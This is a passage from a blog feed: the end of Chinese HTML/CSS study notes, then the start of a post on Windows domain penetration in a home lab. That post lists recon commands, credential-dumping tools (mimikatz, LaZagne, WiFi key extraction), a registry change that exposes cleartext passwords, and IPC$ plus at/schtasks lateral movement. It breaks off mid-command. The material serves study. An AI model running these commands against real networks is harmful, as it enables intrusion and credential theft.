&lt;/head&gt;    &lt;frameset rows=&quot;50%,50%&quot;&gt;         &lt;frame src=&quot;https://nsl.lenovo.com.cn/&quot; scrolling=&quot;no&quot; /&gt;        &lt;frame src=&quot;http://www.sogou.com&quot; /&gt;    &lt;/frameset&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324224952975.png" alt="image-20220324224952975" style="zoom:50%;"><hr><h1 id="div-css"><a href="#div-css" class="headerlink" title="div css"></a>div css</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p><p>CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。</p><p>DIV是html的一个标签 css是一个样式表</p><h2 id="样式表类型"><a href="#样式表类型" class="headerlink" title="样式表类型"></a>样式表类型</h2><h3 id="嵌入式样式表"><a href="#嵌入式样式表" class="headerlink" title="嵌入式样式表"></a>嵌入式样式表</h3><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;        &lt;style&gt;            .demo01&#123;                color: mediumvioletred;                width: 1000px;                height: 500px;                background: salmon;            &#125;        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div class=&quot;demo01&quot;&gt;            人生若只如初见，何事秋风悲画扇        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325210711988.png" alt="image-20220325210711988"></p><h3 id="外部样式"><a href="#外部样式" class="headerlink" title="外部样式"></a>外部样式</h3><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;/&gt;@import url@import url(&quot;g.css&quot;);.demo1&#123;                color: red;                width: 100px;                height: 100px;                background: blue;            &#125;</code></pre><p><strong>1、link直接引用</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325211849732.png" alt="image-20220325211849732"></p><p><strong>2、在外部再引用外部</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325212537499.png" alt="image-20220325212537499"></p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325212557848.png" alt="image-20220325212557848" style="zoom:50%;"><h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><pre><code class="html">&lt;div style=&quot;color: blue;width: 100px;height: 100px; background: black;&quot;&gt;demo2&lt;/div&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325213538813.png" alt="image-20220325213538813"></p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><pre><code class="html">/* */ 注释内容</code></pre><h2 id="样式选择器"><a href="#样式选择器" class="headerlink" title="样式选择器"></a>样式选择器</h2><pre><code class="html">元素选择器   div&#123;属性:值&#125;ID选择器  #id&#123;属性:值&#125;class选择器  .类名&#123;属性:值&#125;子选择器    元数 空格 元素&#123;属性:值&#125;后代选择器  元数 &gt; 元数&#123;属性:值&#125;属性选择器  元素[属性]&#123;&#125;通配符选择器  *&#123;属性:值&#125;群组选择器  把相同的元素写在一起</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325220117278.png" alt="image-20220325220117278"></p><p><strong>通配符选择器示意</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325220708388.png" alt="image-20220325220708388"></p><p><strong>群组选择器</strong></p><p>把相同的元素写在一起，减少重复代码</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325221110722.png" alt="image-20220325221110722"></p><p><strong>子选择器/后代选择器</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325222155359.png" alt="image-20220325222155359"></p><h2 id="背景和边框"><a href="#背景和边框" class="headerlink" title="背景和边框"></a>背景和边框</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>background-color   规定要使用的背景颜色。</p><p>background-position    规定背景图像的位置。    </p><p>background-size     规定背景图片的尺寸。    </p><p>background-repeat  规定如何重复背景图像。  </p><pre><code>repeat  默认。背景图像将在垂直方向和水平方向重复。repeat-x 背景图像将在水平方向重复。repeat-y 背景图像将在垂直方向重复。no-repeat   背景图像将仅显示一次。inherit  规定应该从父元素继承 background-repeat 属性的设置。</code></pre><p>background-origin  规定背景图片的定位区域。    </p><p>background-clip     规定背景的绘制区域。    </p><p>background-attachment  规定背景图像是否固定或者随着页面的其余部分滚动。    </p><pre><code class="html">背景图片的滚动背景图片是否随着内容的滚动而滚动由background-attachment设置background-attachment:fixed; 固定，不随内容的滚动而滚动background-attachment:scroll; 滚动，随内容的滚动而滚动</code></pre><p>background-image  规定要使用的背景图像。</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325224711431.png" alt="image-20220325224711431"></p><p>上述body可直接简写为</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325224906687.png" alt="image-20220325224906687"></p><p>inherit  规定应该从父元素继承 background 属性的设置。  </p><p>left top</p><p>left center</p><p>left bottom</p><p>right top</p><p>right center</p><p>right bottom</p><p>center top</p><p>center center</p><p>center bottom</p><h3 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h3><p>边框颜色 border-color:#000</p><p>边框宽度 border-width:1px;</p><p>border-left 设置左边框，一般单独设置左边框样式使用</p><p>border-right 设置右边框，一般单独设置右边框样式使用</p><p>border-top 设置上边框，一般单独设置上边框样式使用</p><p>border-bottom 设置下边框，一般单独设置下边框样式使用,有时可将下边框样式作为css下划线效果应用。</p><p><strong>边框样式值如下：</strong></p><p>none : 　无边框。与任何指定的border-width值无关</p><p>hidden : 　隐藏边框。IE不支持</p><p>dotted : 　在MAC平台上IE4+与WINDOWS和UNIX平台上IE5.5+为点线。否则为实线（常用）</p><p>dashed : 　在MAC平台上IE4+与WINDOWS和UNIX平台上IE5.5+为虚线。否则为实线（常用）</p><p>solid : 　实线边框（常用）</p><p>double : 　双线边框。两条单线与其间隔的和等于指定的border-width值</p><p><strong>上 右 下左：</strong></p><p>groove : 　根据border-color的值画3D凹槽</p><p>ridge : 　根据border-color的值画菱形边框</p><p>inset : 　根据border-color的值画3D凹边</p><p>outset : 　根据border-color的值画3D凸边</p><p><strong>上 右 下左 简写：</strong></p><p>border:5px solid red;</p><p> <img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325231755509.png" alt="image-20220325231755509"></p><h2 id="文字属性"><a href="#文字属性" class="headerlink" title="文字属性"></a>文字属性</h2><p>color:red; 文字颜色 #ffeeees</p><p>font-size:12px; 文字大小</p><p>font-weight:bolds 文字粗细(bold/normal)</p><p>font-family:”宋体”文字字体</p><p>font-variant:small-caps小写字母以大写字母显示</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326001639314.png" alt="image-20220326001639314"></p><h2 id="文本属性-1"><a href="#文本属性-1" class="headerlink" title="文本属性"></a>文本属性</h2><p>text-align:center; 文本对齐(right/left/center)</p><p>line-height:10px; 行间距(可通过它实现文本的垂直居中)</p><p>text-indent:20px; 首行缩进</p><p>text-decoration:none;</p><p>文本线(none/underline/overline/line-through) underline/overline/line-through; 定义文本上的下划线/上划线/中划线</p><p>letter-spacing: 字间距</p><p>文本域示例:</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326004753645.png" alt="image-20220326004753645"></p><h2 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h2><p>list-style-type   设置列表项标记的类型。参阅：list-style-type 中可能的值。</p><p>list-style-image 使用图像来替换列表项的标记。参阅：list-style-image 中可能的值。</p><p>inherit  规定应该从父元素继承 list-style 属性的值</p><pre><code>取值:​    disc: 点​    circle: 圆圈​    square: 正方形​    decimal: 数字​    decimal-leading-zero: 十进制数，不足两位的补齐前导0，例如: 01, 02, 03, ..., 98, 99​    lower-roman: 小写罗马文字，例如: i, ii, iii, iv, v, ...​    upper-roman: 大写罗马文字，例如: I, II, III, IV, V, ...​    lower-greek: 小写希腊字母，例如: α(alpha), β(beta), γ(gamma), ...​    lower-latin: 小写拉丁文，例如: a, b, c, ... z​    upper-latin: 大写拉丁文，例如: A, B, C, ... Z​    armenian: 亚美尼亚数字​    georgian: 乔治亚数字，例如: an, ban, gan, ..., he, tan, in, in-an, ...​    lower-alpha: 小写拉丁文，例如: a, b, c, ... z​    upper-alpha: 大写拉丁文，例如: A, B, C, ... Z​    none: 无(取消所有的list样式)​    inherit:继承</code></pre><p>list-style-position   设置在何处放置列表项标记。参阅：list-style-position 中可能的值。</p><pre><code>inside列表项目标记放置在文本以内，且环绕文本根据标记对齐。outside默认值。保持标记位于文本的左侧。列表项目标记放置在文本以外，且环绕文本不根据标记对齐。简写list-style:square inside url(&#39;/i/arrow.gif&#39;);</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326011302577.png" alt="image-20220326011302577"></p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><pre><code>a&#123;text-decoration: none;&#125;a:link &#123;color:#FF0000;&#125; /* 未访问的链接 */a:visited &#123;color:#00FF00;&#125; /* 已访问的链接 */a:hover &#123;color:#FF00FF;&#125; /* 鼠标划过链接 */a:active &#123;color:#0000FF;&#125; /* 已选中的链接 */</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326012956179.png" alt="image-20220326012956179"></p><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326171556178.png" alt="image-20220326171556178"></p><p>盒子模型的组成部分：</p><p>外边距（margin）、边框（border）、内边距（padding）、内容（content）四个属性</p><p>自身的身高:width height </p><p>内边距: padding</p><p>盒子边框:border</p><p>与其他盒子的距离 margin 外边距</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326172438006.png" alt="image-20220326172438006"></p><h2 id="border边框"><a href="#border边框" class="headerlink" title="border边框"></a>border边框</h2><p>常见的写法 border:1px solid #foo;</p><p>单独属性:</p><p>border-widh:</p><p>border-style:</p><pre><code>dotted 点状虚线dashed（虚线）solid（实线）double（双实线）border-color(颜色)</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326173422032.png" alt="image-20220326173422032"></p><h2 id="margin-padding"><a href="#margin-padding" class="headerlink" title="margin padding"></a>margin padding</h2><p>padding:内边距</p><p>值：像素/厘米等长度单位、百分比</p><p>padding:10px; 上下左右</p><p>padding:10px 10px; 上下 左右</p><p>padding:10px 10px 10px; 上 左右 下</p><p>padding:10px 10px 10px 10px; 上 右 下 左（设置4个点–&gt;顺时针方向）</p><p>单独属性</p><p>padding-top:</p><p>padding-right:</p><p>padding-bottom:</p><p>padding-left:</p><p>当设置内边距的时候会把盒子撑大，为了保持盒子原来的大小，应该高度和宽度进行减小，根据width和height减小</p><p>margin 外边距值：与padding相同</p><p> 单独属性：与padding相同 </p><p>外边距合并：两个盒子同时设置了外边距，会进行一个外边距合并 </p><p>margin</p><p>margin:10px 上下左右都会腾出10px出来</p><p>margin:0px auto; 居中</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326175233023.png" alt="image-20220326175233023"></p><p><strong>让div和内容居中</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326180736898.png" alt="image-20220326180736898"></p><h2 id="float-脱离文档流浮动"><a href="#float-脱离文档流浮动" class="headerlink" title="float 脱离文档流浮动"></a>float 脱离文档流浮动</h2><p>left 元素向左浮动。</p><p>right 元素向右浮动</p><p>清除浮动:</p><pre><code>clear: both;leftright</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326210210962.png" alt="image-20220326210210962"></p><h2 id="块级元素行内元素"><a href="#块级元素行内元素" class="headerlink" title="块级元素行内元素"></a>块级元素行内元素</h2><p><strong>块级元素</strong></p><p>他会独占一行，在默认情况下，其宽度自动填满其父元素的宽度；</p><p>块级元素可以设置width、height属性；</p><p>块级元素即使设置了宽度也是独占一行，块级元素可以设置margin、padding属性</p><p><strong>行内元素</strong></p><p>行内元素不会独占一行，相邻的行内元素会排列在同一行里，直到行排不下，就自动换行，其宽度随内容而变化；</p><p>行内元素的width、height属性则无效；</p><p>行内元素的margin、padding属性很奇怪，水平方向的padding-left、padding-rigtht、margin-left、padding-right都会产生边距效果，但是竖直方向的padding-top、padding-bottom、margin-top、margin-bottom却不产生边距效果。</p><p><strong>块级元素(block element)</strong></p><pre><code>address 地址center 举中对齐块div- 常用块级容易dl 定义列表form 交互表单 （只能用来容纳其它块元素）h标签hr 水平分隔线ol 无需列表ul有序列表p 段落pre 格式化文本</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326211940013.png" alt="image-20220326211940013"></p><p><strong>行内元素转换</strong></p><pre><code>display:none; 不显示display:block;变成块级元素display:inline; 变成行内元素display:inline-block;以块级元素样式展示，以行级元素样式排列</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326212608009.png" alt="image-20220326212608009"></p><p>两个块级元素此时在同一行了</p><p><strong>行内元素溢出处理</strong></p><pre><code>overflow 属性规定当内容溢出元素框时发生的事情：visible    默认值。内容不会被修剪，会呈现在元素框之外。hidden    内容会被修剪，并且其余内容是不可见的。scroll    内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。auto    如果内容被修剪，则浏览器会显示滚动条以便查看其余的内容。inherit    规定应该从父元素继承 overflow 属性的值。</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326214145022.png" alt="image-20220326214145022"></p><p>我们可以看到此时元素超出的边框</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326214302027.png" alt="image-20220326214302027"></p><p>添加overflow后会增加一个拖动条</p><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><pre><code>positionstatic静态定位（不对它的位置进行改变，在哪里就在那里）默认值。没有定位，元素出现在正常的流中（忽略 top,bottom, left, right 或者z-index 声明）。fixed固定定位（参照物--浏览器窗口）---做 弹窗广告用到生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 &quot;left&quot;, &quot;top&quot;, &quot;right&quot;以及 &quot;bottom&quot;属性进行规定。relative（相对定位 ）（参照物以他本身）生成相对定位的元素，相对于其正常位置进行定位。absolute（绝对定位）(除了static都可以，找到参照物--&gt;与它最近的已经有定位的父元素进行定位)生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位。元素的位置通过 &quot;left&quot;, &quot;top&quot;, &quot;right&quot; 以及 &quot;bottom&quot; 属性进行规定z-indexz-index 属性设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。定位的基本思想: 它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220327005012845.png" alt="image-20220327005012845"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;简单的HTML页面架构&quot;&gt;&lt;a href=&quot;#简单的HTML页面架构&quot; class=&quot;headerlink&quot; title=&quot;简单的HTML页面架构&quot;&gt;&lt;/a&gt;简单的HTML页面架构&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;</summary>
      
    
    
    
    <category term="语言" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/"/>
    
    <category term="html" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/html/"/>
    
    
    <category term="html" scheme="https://sakurahack-y.github.io/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透篇</title>
    <link href="https://sakurahack-y.github.io/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/"/>
    <id>https://sakurahack-y.github.io/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/</id>
    <published>2022-03-18T06:56:01.000Z</published>
    <updated>2022-03-31T16:30:08.477Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="域的搭建"><a href="#域的搭建" class="headerlink" title="域的搭建"></a>域的搭建</h1><p>实验环境:</p><p>win2008 域控       本地管理员密码:0801.com  域密码:yk2008.com    ip:192.168.137.2     </p><p>win 2008 域成员  本地管理员密码:0802.com  域密码:yc2008.com    ip:192.168.137.66</p><p>win 2003 域成员  本地管理员密码:0301.com  域密码: yc2003.com    ip:192.168.137.99</p><p><strong>配置域控2008</strong></p><p>使用vm1网卡</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141739390.png" alt="image-20220322141739390"></p><p>配置ip</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141649714.png" alt="image-20220322141649714"></p><p>找到服务器管理器</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135655066.png" alt="image-20220322135655066"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135624657.png" alt="image-20220322135624657"></p><p>一直下一步，然后安装</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140010325.png" alt="image-20220322140010325"></p><p>安装成功</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140057795.png" alt="image-20220322140057795"></p><p>运行dcpromo程序:</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141947512.png" alt="image-20220322141947512"></p><p>一直下一步，到这里新建域</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142110877.png" alt="image-20220322142110877"></p><p>命名林根域</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142158498.png" alt="image-20220322142158498"></p><p>选择2008 R2</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142302851.png" alt="image-20220322142302851"></p><p>一直下一步/默认是，到这一步设置密码为:yk2008.com</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142632261.png" alt="image-20220322142632261"></p><p>一直下一步</p><p>完成了域控的配置，并重启</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142812609.png" alt="image-20220322142812609"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142833978.png" alt="image-20220322142833978"></p><p>重启后，有域的标识出现，我们使用前文设置的域控密码登录</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322143248873.png" alt="image-20220322143248873"></p><p>进入后</p><p>打开域管理中心</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322150310596.png" alt="image-20220322150310596"></p><p>打开用户和计算机，新建组织hack</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151545759.png" alt="image-20220322151545759"></p><p>在这个组分别建立server2003用户和server2008用户，设置域密码分别为 yc2003.com和yc2008.com</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151809690.png" alt="image-20220322151809690"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151918916.png" alt="image-20220322151918916"></p><p>到这里域控的配置就完成了，接下来就让域成员加入域</p><p>进入windows2003</p><p>更改计算机名加入域</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322153432998.png" alt="image-20220322153432998"></p><p>windows2008同理</p><p>然后重启</p><p>输入加入域的计算机名</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154303764.png" alt="image-20220322154303764"></p><p>成功登入</p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154329618.png" alt="image-20220322154329618" style="zoom:50%;"><p>我们在域控中就能看到两台计算机上线</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154709810.png" alt="image-20220322154709810"></p><p>域环境就搭建好了</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><strong>基本信息收集：</strong></p><p>了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备</p><pre><code>systeminfo 详细信息net start 启动服务tasklist 进程列表schtasks 计划任务</code></pre><p><strong>网络信息收集:</strong></p><p>了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备</p><pre><code>ipconfig /all 判断存在域-dnsnet view /domain 判断存在域net time /domain 判断主域netstat -ano 当前网络端口开放nslookup 域名 追踪来源地址</code></pre><p><strong>用户信息收集:</strong></p><p>了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试</p><pre><code>Domain Admins：域管理员（默认对域控制器有完全控制权）Domain Computers：域内机器Domain Controllers：域控制器Domain Guest：域访客，权限低Domain Users：域用户Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）相关用户收集操作命令：whoami /all 用户权限net config workstation 登录信息net user 本地用户net localgroup 本地用户组net user /domain 获取域用户信息net group /domain 获取域用户组信息wmic useraccount get /all 涉及域用户详细信息net group &quot;Domain Admins&quot; /domain 查询域管理员账户net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组net group &quot;Domain Controllers&quot; /domain 查询域控制器</code></pre><p><strong>凭据信息收集操作:</strong></p><p>收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p><pre><code>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)Netsh WLAN show profilesNetsh WLAN show profile name=&quot;无线名称&quot; key=clear1.站点源码备份文件、数据库备份文件等2.各类数据库 Web 管理入口，如 PHPMyAdmin3.浏览器保存密码、浏览器 Cookies4.其他用户会话、3389 和 ipc$连接记录、回收站内容5.Windows 保存的 WIFI 密码6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等</code></pre><p><strong>探针主机域控架构服务:</strong></p><p>为后续横向思路做准备，针对应用，协议等各类攻击手法</p><pre><code>探针域控制器名及地址信息net time /domain nslookup ping探针域内存活主机及地址信息nbtscan 192.168.3.0/24 第三方工具for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot; 自带内部命令nmap masscan 第三方 PowerShell 脚本 nishang empire 等#导入模块 nishangImport-Module .\nishang.psm1#设置执行策略Set-ExecutionPolicy RemoteSigned#获取模块 nishang 的命令函数Get-Command -Module nishang#获取常规计算机信息Get-Information#端口扫描（查看目录对应文件有演示语法，其他同理）Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort#其他功能：删除补丁，反弹 Shell，凭据获取等探针域内主机角色及服务信息利用开放端口服务及计算机名判断核心业务机器:1.高级管理人员、系统管理员、财务/人事/业务人员的个人计算机2.产品管理系统服务器3.办公系统服务器4.财务应用系统服务器5.核心产品源码服务器（自建 SVN、GIT）6.数据库服务器7.文件或网盘服务器、共享服务器8.电子邮件服务器9.网络监控系统服务器10.其他服务器（内部技术文档服务器、其他监控服务器等）</code></pre><h1 id="域横向"><a href="#域横向" class="headerlink" title="域横向"></a>域横向</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/1b22fbb60e7aa3f167c08e67c61e025e73769fd3.png@942w_611h_progressive.webp" alt="img"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320150741924.png" alt="image-20220320150741924"></p><h2 id="域横向必备知识点"><a href="#域横向必备知识点" class="headerlink" title="域横向必备知识点"></a><strong>域横向必备知识点</strong></h2><p><strong>知识点1：</strong><br>Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码<br>Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码</p><pre><code>针对以上情况，我们提供了4种方式解决此类问题1.利用哈希 hash 传递(pth，ptk等)进行移动2.利用其它服务协议(SMB,WMI等)进行哈希移动3.利用注册表操作开启Wdigest Auth值进行获取4.利用工具或第三方平台(Hachcat)进行破解获取</code></pre><pre><code>#注册表操作开启Wdigest Auth值reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p><strong>知识点2：</strong><br>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p><pre><code>#获取win密码hash的两个工具Pwdump7QuarksPwdump</code></pre><p><strong>知识点3：</strong><br>域用户与本地用户的区别<br>比如，<code>god/administrator</code>是域用户，<code>./administrator</code>是本地用户</p><h2 id="at-amp-amp-schtasks-密码是明文"><a href="#at-amp-amp-schtasks-密码是明文" class="headerlink" title="at&amp;&amp;schtasks(密码是明文)"></a><strong>at&amp;&amp;schtasks(密码是明文)</strong></h2><p><strong>优点:官方自带命令，不会被杀</strong></p><p><strong>缺点:命令比较繁琐，且只支持明文密码</strong></p><p>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？ 这里介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主 机上执行命令</p><p>获取到某域主机权限–&gt;minikatz 得到密码（明文，hash）–&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典–&gt;尝试连接–&gt;创建计划任务(at|schtasks)–&gt;执行文件可为后门或者相关命令</p><p>利用流程:</p><ol><li>建立 IPC 链接到目标主机 (目标主机要开启135，445)</li><li> 拷贝要执行的命令脚本到目标主机 </li><li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本 </li><li> 删除 IPC 链接 </li></ol><pre><code>net use \\server\ipc$&quot;password&quot; /user:username # 工作组 net use \\server\ipc$&quot;password&quot; /user:domain\username #域内 dir \\xx.xx.xx.xx\C$\ # 查看文件列表 copy \\xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件 copy 1.bat \\xx.xx.xx.xx\C$ # 复制文件 net use \\xx.xx.xx.xx\C$\1.bat /del # 删除 IPC net view xx.xx.xx.xx # 查看对方共享 #建立 IPC 常见的错误代码 （1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限 （2）51：网络问题，Windows 无法找到网络路径 （3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题 （4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$ （5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除 （6）1326：账号密码错误 （7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况 （8）2242：用户密码过期，目标有账号策略，强制定期更改密码 #建立 IPC 失败的原因 （1）目标系统不是 NT 或以上的操作系统 （2）对方没有打开 IPC$共享 （3）对方未开启 139、445 端口，或者被防火墙屏蔽 （4）输出命令、账号密码有错误</code></pre><pre><code>[at] &amp; [schtasks]#at &lt; Windows2012net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立 ipc 连接：copy add.bat \\192.168.3.21\c$ #拷贝执行文件到目标机器at \\192.168.3.21 15:47 c:\add.bat #添加计划任务#schtasks &gt;=Windows2012net use 